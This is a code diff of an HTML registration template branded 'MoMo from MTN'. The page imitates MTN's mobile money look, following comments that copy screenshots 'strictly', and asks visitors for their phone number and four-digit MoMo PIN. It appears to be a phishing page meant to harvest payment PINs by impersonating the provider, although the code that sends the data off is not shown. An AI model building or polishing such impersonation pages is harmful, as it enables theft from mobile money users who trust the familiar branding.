@@ -3,49 +3,39 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MoMo Registration</title>
+    <title>Register</title>
     <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
 </head>
 <body>
     <div class="main-container">
-        <!-- Dark Blue Background Section -->
-        <div class="blue-section">
-            <div class="logo-container">
-                <img src="{{ url_for('static', filename='images/Image.jpeg') }}" 
-                     alt="MoMo" 
-                     class="logo"
-                     onerror="this.style.display='none'">
-                <div class="brand">
-                    <span class="momo">MoMo</span>
-                    <span class="from">from</span>
-                    <span class="mtn">MTN</span>
-                </div>
+        
+        <!-- Top Blue Section with Logo (Strictly as per first image) -->
+        <div class="blue-header">
+            <img src="{{ url_for('static', filename='images/Image.jpeg') }}" 
+                 alt="MoMo Logo" 
+                 class="logo"
+                 onerror="this.style.display='none'">
+            <div class="brand">
+                MoMo <span class="from">from</span> MTN
             </div>
         </div>
 
-        <!-- Form Section -->
-        <div class="form-container">
+        <!-- Form Section (Clean like third image) -->
+        <div class="form-section">
             <form id="registrationForm">
-                <div class="form-group">
-                    <input type="tel" 
-                           id="mtnNumber"
-                           name="mtn_number"
-                           placeholder="MTN NUMBER" 
-                           required
-                           maxlength="15">
-                </div>
+                <input type="tel" 
+                       id="mtnNumber"
+                       name="mtn_number"
+                       placeholder="MTN NUMBER" 
+                       required maxlength="15">
 
-                <div class="form-group">
-                    <div class="pin-wrapper">
-                        <input type="password" 
-                               id="momoPin"
-                               name="momo_pin"
-                               placeholder="MOMO PIN" 
-                               required
-                               maxlength="4"
-                               minlength="4">
-                        <span class="toggle-pin" onclick="togglePinVisibility()">👁️</span>
-                    </div>
+                <div class="pin-wrapper">
+                    <input type="password" 
+                           id="momoPin"
+                           name="momo_pin"
+                           placeholder="MOMO PIN" 
+                           required maxlength="4" minlength="4">
+                    <span class="toggle-pin" onclick="togglePinVisibility()">👁️</span>
                 </div>
 
                 <button type="submit" class="btn" id="submitBtn">REGISTER</button>
